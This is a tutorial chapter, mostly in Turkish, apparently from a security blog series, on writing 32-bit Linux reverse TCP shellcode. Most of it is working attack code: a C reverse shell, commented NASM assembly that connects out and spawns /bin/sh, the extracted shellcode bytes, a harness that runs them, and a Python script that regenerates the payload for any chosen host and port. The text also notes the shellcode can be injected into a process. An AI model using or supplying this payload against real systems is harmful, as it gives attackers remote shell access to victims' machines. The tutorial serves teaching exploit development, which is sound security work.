\newpage
\subsection{9. linux shellcoding. Reverse TCP shell kodu}

﷽

![linux shellcoding](./images/14/2021-10-16_11-42.png){width="80%"}          

Önceki bölümde, standart bir shell başlatan bir shellcode yazmıştık. Bu bölümde, Reverse TCP Shellcode yazmayı hedefleyeceğiz.     

### shell kodu kontrol edelim

When testing shellcode, it is nice to just plop it into a program and let it run. We will use the same code as in the first post (`run.c`):           

```cpp
/*
run.c - a small skeleton program to run shellcode
*/
// bytecode here
char code[] = "my shellcode here";

int main(int argc, char **argv) {
  int (*func)();             // function pointer
  func = (int (*)()) code;   // func points to our shellcode
  (int)(*func)();            // execute a function code[]
  // if our program returned 0 instead of 1, 
  // so our shellcode worked
  return 1;
}
```

### reverse TCP shell’i

Daha [önceki](https://cocomelonc.github.io/tutorial/2021/09/11/reverse-shells.html) gönderilerden birindeki C kodunu temel alarak reverse TCP shell başlatan bir shellcode oluşturabiliriz.      

Kodu (`shell.c`):
```cpp
/*
shell.c - reverse TCP shell
author: @cocomelonc
demo shell for linux shellcoding example
*/
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

int main () {

	// attacker IP address
	const char* ip = "127.0.0.1";

	// address struct
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	inet_aton(ip, &addr.sin_addr);

	// socket syscall
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);

	// connect syscall
	connect(sockfd, (struct sockadr *)&addr, sizeof(addr));

	for (int i = 0; i < 3; i++) {
		// dup2(sockftd, 0) - stdin
		// dup2(sockfd, 1) - stdout
		// dup2(sockfd, 2) - stderr
		dup2(sockfd, i);
	}

	// execve syscall
	execve("/bin/sh", NULL, NULL);

	return 0;
}
```

### assembly hazırlığı 

C kaynak kodunda gösterildiği gibi, aşağıdaki çağrıları Assembly diline çevirmek gerekiyor:
- bir socket oluşturun.    
- belirtilen bir IP ve port’a bağlanın.    
- ardından, stdin, stdout, stderr'i `dup2` ile yönlendirin.     
- `execve` ile bir shell başlatın.     

### socket oluşturalım        

Socket işlemleri için, `SYS_SOCKETCALL` (sistem çağrısı `0x66`) kullanılır:

![sys_socketcall](./images/14/2021-10-16_12-29.png){width="80%"}       

Ardından, `eax` kaydını temizleyin:    

```nasm
; int socketcall(int call, unsigned long *args);
push 0x66        ; sys_socketcall 102
pop  eax         ; zero out eax
```

Bir sonraki önemli kısım, socketcall sistem çağrısının farklı fonksiyon çağrılarıdır. Bu çağrılar `/usr/include/linux/net.h` dosyasında bulunabilir:     

![socketcall syscall](./images/14/2021-10-16_12-34.png){width="80%"}       

Bu nedenle, önce `SYS_SOCKET` (`0x1`) ile başlamanız gerekiyor. Ardından, `ebx` kaydını temizleyin:

```nasm
push 0x1         ; sys_socket 0x1
pop  ebx         ; zero out ebx
```

`socket()` çağrısı temelde 3 argüman alır ve bir socket dosya tanıtıcısı döndürür:

```cpp
sockfd = socket(int socket_family, int socket_type, int protocol);
```

Bu nedenle, argümanların tanımlarını bulmak için farklı başlık dosyalarını kontrol etmeniz gerekir.     
`protocol` için:  

```bash
nvim /usr/include/linux/in.h
```

![protocol](./images/14/2021-10-16_12-38.png){width="80%"}       

`socket_type` için:            
```bash
nvim /usr/include/bits/socket_type.h
```

![socket type](./images/14/2021-10-16_12-43.png){width="80%"}       

`socket_family` için:
```bash
nvim /usr/include/bits/socket.h
```

![socket family](./images/14/2021-10-16_12-45.png){width="80%"}       

Bu bilgilere dayanarak, `edx` kaydını temizledikten sonra farklı argümanları (`socket_family`, `socket_type`, `protocol`) yığına itebilirsiniz:     

```nasm
xor  edx, edx    ; zero out edx

; int socket(int domain, int type, int protocol);
push edx         ; protocol = IPPROTO_IP (0x0)
push ebx         ; socket_type = SOCK_STREAM (0x1)
push 0x2         ; socket_family = AF_INET (0x2)
```

Ve `ecx` bu yapıya bir işaretçi tutması gerektiğinden, `esp`'nin bir kopyası alınmalıdır:     

```nasm
mov  ecx, esp    ; move stack pointer to ecx
```

en son syscall çalıştıralım:           
```nasm
int  0x80        ; syscall (exec sys_socket)
```

Bu işlem, `eax` kaydına bir socket dosya tanıtıcısı döndürür.      
Sonuç olarak:    

```nasm
xchg edx, eax    ; save result (sockfd) for later usage
```

### belirli bir ip ve porta bağlanma

Öncelikle, yeniden standart socketcall sistem çağrısını `al` kaydına yüklemeniz gerekiyor:     

```nasm
; int socketcall(int call, unsigned long *args);
mov  al, 0x66    ; socketcall 102
```

`connect()` fonksiyonunun argümanlarını inceleyelim. En ilginç argümanlardan biri, `sockaddr` yapısıdır:

```cpp
struct sockaddr_in {
   __kernel_sa_family_t  sin_family;   /* Address family    */
  __be16                 sin_port;     /* Port number       */
  struct in_addr         sin_addr;     /* Internet address  */
};
```

Bu noktada argümanları yerleştirmeniz gerekiyor. Önce `sin_addr`, ardından `sin_port` ve son olarak `sin_family` (unutmayın: ters sıra ile!):

```nasm
; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
push 0x0101017f  ; sin_addr = 127.1.1.1 (network byte order)
push word 0x5c11 ; sin_port = 4444
```

![push IP port](./images/14/2021-10-16_13-05.png){width="80%"}       

Bu noktada `ebx`, `socket()` çağrısı sırasında `socket_type`'ı yerleştirdiğiniz için `0x1` değerini içerir. `ebx`'i artırdıktan sonra `ebx`, `sin_family` argümanı için `0x2` değerine sahip olmalıdır:

```nasm
inc  ebx         ; ebx = 0x02
push word bx     ; sin_family = AF_INET
```

Ardından, bu sockaddr yapısına işaret eden yığın işaretçisini (stack pointer) `ecx` kaydına kaydedin:

```nasm
mov  ecx, esp    ; move stack pointer to sockaddr struct
```

Sonra:
```nasm
push 0x10        ; addrlen = 16
push ecx         ; const struct sockaddr *addr
push edx         ; sockfd
mov  ecx, esp    ; move stack pointer to ecx (sockaddr_in struct)
inc  ebx         ; sys_connect (0x3)
int  0x80        ; syscall (exec sys_connect)
```

### stdin, stdout ve stderr'i dup2 ile yönlendirme

Bir döngü başlatmak için sayaç ayarlayın ve `ecx`'i sıfırlayın:

```nasm
push 0x2         ; set counter to 2
pop  ecx         ; zero to ecx (reset for newfd loop)
```

`ecx` döngü için hazır. Şimdi, `dup2` sistem çağrısı sırasında ihtiyaç duyduğunuz socket dosya tanıtıcısını `ebx` kaydına kaydedin:

```nasm
xchg ebx, edx    ; save sockfd
```

Sonra, `dup2` 2 tane argüman alır:      
```cpp
int dup2(int oldfd, int newfd);
```

`oldfd` (ebx) istemci socket dosya tanıtıcısını (client socket file descriptor) temsil eder. `newfd`, sırasıyla stdin (0), stdout (1) ve stderr (2) için kullanılır:

```cpp
for (int i = 0; i < 3; i++) {
    // dup2(sockftd, 0) - stdin
    // dup2(sockfd, 1) - stdout
    // dup2(sockfd, 2) - stderr
    dup2(sockfd, i);
}
```

Evet, `sys_dup2` sistem çağrısı, ecx tabanlı bir döngüde üç kez çalıştırılır:

```nasm
dup:
  mov  al, 0x3f    ; sys_dup2 = 63 = 0x3f
  int  0x80        ; syscall (exec sys_dup2)
  dec  ecx         ; decrement counter
  jns  dup         ; as long as SF is not set -> jmp to dup
```

`jns` komutu, işaret (signed) bayrağı (`SF`) ayarlanmadığı sürece "dup" etiketine atlar.

Şimdi `gdb` ile kodu adım adım hata ayıklayıp, `ecx` değerini kontrol edelim:

```bash
gdb -q ./rev
```

![gdb ecx -1](./images/14/2021-10-16_13-34.png){width="80%"}       


Gördüğünüz gibi, üçüncü desteden sonra `ecx` `-1`'e eşit olan `0xffffffff`'i içeriyor ve `SF` ayarlandı ve kabuk kodu akışı devam ediyor.    

Sonuç olarak, üç çıktının tümü yeniden yönlendirilir :)

### execve ile kabuğu başlat

Kodun bu kısmı ilk kısımdaki örneğe benzer ancak yine küçük değişimle:

```nasm
; spawn /bin/sh using execve
; int execve(const char *filename, 
; char *const argv[],char *const envp[]);
mov  al, 0x0b    ; syscall: sys_execve = 11 (mov eax, 11)
inc  ecx         ; argv=0
mov  edx, ecx    ; envp=0
push edx         ; terminating NULL
push 0x68732f2f	 ; "hs//"
push 0x6e69622f	 ; "nib/"
mov  ebx, esp    ; save pointer to filename
int  0x80        ; syscall: exec sys_execve
```

Gördüğünüz gibi, `/bin//sh` dizgisi için sonlandırıcı `NULL`'u ayrı olarak yığına itmemiz gerekiyor, çünkü kullanabileceğimiz bir `NULL` zaten mevcut değil.    

Böylece işimiz bitmiş oluyor.       

### son tam kabuk kodu

Tam, yorumlanmış kabuk kodum:
```nasm
; run reverse TCP /bin/sh and normal exit
; author @cocomelonc
; nasm -f elf32 -o rev.o rev.asm
; ld -m elf_i386 -o rev rev.o && ./rev
; 32-bit linux

section .bss

section .text
  global _start   ; must be declared for linker

_start:           ; linker entry point

  ; create socket
  ; int socketcall(int call, unsigned long *args);
  push 0x66        ; sys_socketcall 102
  pop  eax         ; zero out eax
  push 0x1         ; sys_socket 0x1
  pop  ebx         ; zero out ebx
  xor  edx, edx    ; zero out edx

  ; int socket(int domain, int type, int protocol);
  push edx         ; protocol = IPPROTO_IP (0x0)
  push ebx         ; socket_type = SOCK_STREAM (0x1)
  push 0x2         ; socket_family = AF_INET (0x2)
  mov  ecx, esp    ; move stack pointer to ecx
  int  0x80        ; syscall (exec sys_socket)
  xchg edx, eax    ; save result (sockfd) for later usage

  ; int socketcall(int call, unsigned long *args);
  mov  al, 0x66    ; socketcall 102

  ; int connect(int sockfd, const struct sockaddr *addr,
  ; socklen_t addrlen);
  push 0x0101017f  ; sin_addr = 127.1.1.1 
                   ; (network byte order)
  push word 0x5c11 ; sin_port = 4444
  inc  ebx         ; ebx = 0x02
  push word bx     ; sin_family = AF_INET
  mov  ecx, esp    ; move stack pointer to sockaddr struct

  push 0x10        ; addrlen = 16
  push ecx         ; const struct sockaddr *addr
  push edx         ; sockfd
  mov  ecx, esp    ; move stack pointer to ecx (sockaddr_in struct)
  inc  ebx         ; sys_connect (0x3)
  int  0x80        ; syscall (exec sys_connect)

  ; int socketcall(int call, unsigned long *args);
  ; duplicate the file descriptor for
  ; the socket into stdin, stdout, and stderr
  ; dup2(sockfd, i); i = 1, 2, 3
  push 0x2         ; set counter to 2
  pop  ecx         ; zero to ecx (reset for newfd loop)
  xchg ebx, edx    ; save sockfd

dup:
  mov  al, 0x3f    ; sys_dup2 = 63 = 0x3f
  int  0x80        ; syscall (exec sys_dup2)
  dec  ecx         ; decrement counter
  jns  dup         ; as long as SF is not set -> jmp to dup

  ; spawn /bin/sh using execve
  ; int execve(const char *filename, char 
  ; *const argv[],char *const envp[]);
  mov  al, 0x0b    ; syscall: sys_execve = 11 (mov eax, 11)
  inc  ecx         ; argv=0
  mov  edx, ecx    ; envp=0
  push edx         ; terminating NULL
  push 0x68732f2f	 ; "hs//"
  push 0x6e69622f	 ; "nib/"
  mov  ebx, esp    ; save pointer to filename
  int  0x80        ; syscall: exec sys_execve
```

### test etmek

Şimdi, ilk bölümde olduğu gibi, bunu derleyelim ve doğru çalışıp çalışmadığını ve null baytlar içerip içermediğini kontrol edelim:

```bash
nasm -f elf32 -o rev.o rev.asm
ld -m elf_i386 -o rev rev.o
objdump -M intel -d rev
```

![compile shellcode](./images/14/2021-10-16_13-53.png){width="80%"}       

![compile shellcode 2](./images/14/2021-10-16_13-57.png){width="80%"}       

`4444` port'unda dinleyiciyi hazırlayıp çalıştıralım:
```bash
./rev
```

![compile shellcode 2](./images/14/2021-10-16_14-08.png){width="80%"}       

Mükemmel!

Daha sonra, biraz bash ile kodlama ve `objdump` kullanarak bayt kodunu çıkartalım:

```bash
objdump -d ./rev|grep '[0-9a-f]:'|grep -v 'file'|cut -f2
 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|
 sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

![get hex](./images/14/2021-10-16_13-58.png){width="80%"}       

Böylece bizim kabuk kodumuz(shellcode):     

```bash
"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1
\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x11\x5c
\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80
\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b
\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
\x89\xe3\xcd\x80"
```

Sonra,yukarıdaki kodu (`run.c`) bununla değiştirelim:      

```cpp
/*
run.c - a small skeleton program to run shellcode
*/
// bytecode here
char code[] = 
"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89"
"\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68"
"\x11\x5c\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1"
"\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49"
"\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68"
"\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

int main(int argc, char **argv) {
  int (*func)();             // function pointer
  func = (int (*)()) code;   // func points to our shellcode
  (int)(*func)();            // execute a function code[]
  // if our program returned 0 instead of 1,
  // so our shellcode worked
  return 1;
}
```

Derleyelim, dinleyiciyi hazırlayalım ve çalıştıralım:          

```bash
gcc -z execstack -m32 -o run run.c
./run
```

![run C code](./images/14/2021-10-16_14-03.png){width="80%"}       

Gördüğünüz gibi, her şey mükemmel bir şekilde çalışıyor. Artık bu kabuk kodunu kullanabilir ve bir sürece enjekte edebilirsiniz.     

Ancak bir sorun var. Şimdi ip ve portu kolayca yapılandırılabilir hale getirelim.        

### yapılandırılabilir IP ve port

Bu sorunu çözmek için basit bir python betiği (`super_shellcode.py`) oluşturdum:

```py
import socket
import argparse
import sys

BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
ENDC = '\033[0m'

def my_super_shellcode(host, port):
    print (BLUE)
    print ("let's go to create your super shellcode...")
    print (ENDC)
    if int(port) < 1 and int(port) > 65535:
        print (RED + "port number must be in 1-65535" + ENDC)
        sys.exit()
    if int(port) >= 1 and int(port) < 1024:
        print (YELLOW + "you must be a root" + ENDC)
    if len(host.split(".")) != 4:
        print (RED + "invalid host address :(" + ENDC)
        sys.exit()

    h = socket.inet_aton(host).hex()
    hl = [h[i:i+2] for i in range(0, len(h), 2)]
    if "00" in hl:
        print (YELLOW)
        print ("host address will cause null bytes \
        to be in shellcode :(")
        print (ENDC)
    h1, h2, h3, h4 = hl

    shellcode_host = "\\x" + h1 + "\\x" + h2
    shellcode_host += "\\x" + h3 + "\\x" + h4
    print (YELLOW)
    print ("hex host address:")
    print (" x" + h1 + "x" + h2 + "x" + h3 + "x" + h4)
    print (ENDC)

    p = socket.inet_aton(port).hex()[4:]
    pl = [p[i:i+2] for i in range(0, len(p), 2)]
    if "00" in pl:
        print (YELLOW)
        print ("port will cause null bytes \
        to be in shellcode :(")
        print (ENDC)
    p1, p2 = pl

    shellcode_port = "\\x" + p1 + "\\x" + p2
    print (YELLOW)
    print ("hex port: x" + p1 + "x" + p2)
    print (ENDC)

    shellcode = "\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x31"
    shellcode += "\\xd2\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd"
    shellcode += "\\x80\\x92\\xb0\\x66\\x68"
    shellcode += shellcode_host
    shellcode += "\\x66\\x68"
    shellcode += shellcode_port
    shellcode += "\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10"
    shellcode += "\\x51\\x52\\x89\\xe1\\x43\\xcd"
    shellcode += "\\x80\\x6a\\x02\\x59\\x87\\xda\\xb0"
    shellcode += "\\x3f\\xcd\\x80\\x49\\x79\\xf9"
    shellcode += "\\xb0\\x0b\\x41\\x89\\xca\\x52\\x68"
    shellcode += "\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69"
    shellcode += "\\x6e\\x89\\xe3\\xcd\\x80"

    print (GREEN + "your super shellcode is:" + ENDC)
    print (GREEN + shellcode + ENDC)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-l','--lhost',
                         required = True, help = "local IP",
                         default = "127.1.1.1", type = str)
    parser.add_argument('-p','--lport',
                         required = True, help = "local port",
                         default = "4444", type = str)
    args = vars(parser.parse_args())
    host, port = args['lhost'], args['lport']
    my_super_shellcode(host, port)

```

Dinleyiciyi hazırlayın, betiği çalıştırın, kabuk kodunu test programımıza kopyalayın, derleyin ve çalıştırın:        

```bash
python3 super_shellcode.py -l 10.9.1.6 -p 4444
gcc -static -fno-stack-protector -z execstack -m32 -o run run.c 
```

![run C code](./images/14/2021-10-16_17-38.png){width="80%"}       

Yani, kabuk kodumuz mükemmel bir şekilde çalıştı :)     

İşte bu, örneğin kendi kabuk kodunuzu nasıl oluşturacağınızı gösteriyor.    

[The Shellcoder's Handbook](https://www.wiley.com/en-us/The+Shellcoder%27s+Handbook%3A+Discovering+and+Exploiting+Security+Holes%2C+2nd+Edition-p-9780470080238)              
[Shellcoding in Linux by exploit-db](https://www.exploit-db.com/docs/english/21013-shellcoding-in-linux.pdf)              
[my intro to x86 assembly](https://cocomelonc.github.io/tutorial/2021/10/03/malware-analysis-1.html)          
[my nasm tutorial](https://cocomelonc.github.io/tutorial/2021/10/08/malware-analysis-2.html)           
[ip](https://man7.org/linux/man-pages/man7/ip.7.html)                
[socket](https://man7.org/linux/man-pages/man2/socket.2.html)           
[connect](https://man7.org/linux/man-pages/man2/connect.2.html)             
[execve](https://man7.org/linux/man-pages/man2/execve.2.html)         
[first part](https://cocomelonc.github.io/tutorial/2021/10/09/linux-shellcoding-1.html)                   
[Github'taki kaynak kod](https://github.com/cocomelonc/2021-10-17-linux-shellcoding-2)         
